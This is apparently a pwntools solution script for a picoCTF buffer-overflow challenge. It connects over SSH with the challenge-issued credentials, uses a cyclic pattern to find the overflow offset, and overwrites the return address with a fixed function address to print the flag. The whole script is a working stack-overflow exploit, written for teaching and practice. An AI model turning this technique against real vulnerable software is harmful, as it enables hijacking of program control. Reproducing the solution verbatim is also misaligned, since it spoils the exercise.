from pwn import *

PORT = 61499  
s = ssh(user='ctf-player', host='green-hill.picoctf.net', port=PORT, password='fa005713')
sh = s.shell()

sh.sendline('./start')

time.sleep(1)

sh.sendline('ls')

time.sleep(1)

binary = sh.recv(500).decode().split('\n')[6].strip().split()[2]
p = s.run(f'./{binary}')
p.recvuntil(': \n')
p.sendline(cyclic(300))

time.sleep(1)

output = p.recvline().decode().strip().split()[-1][2:]
pattern = bytes.fromhex(output)
offset = cyclic_find(pattern[::-1])

p = s.run(f'./{binary}')
p.recvuntil(': \n')
p.sendline(b'A' * offset + p32(0x80491f6))

time.sleep(1)

p.recvline()
flag = p.recvuntil('}').decode().strip()
print(flag)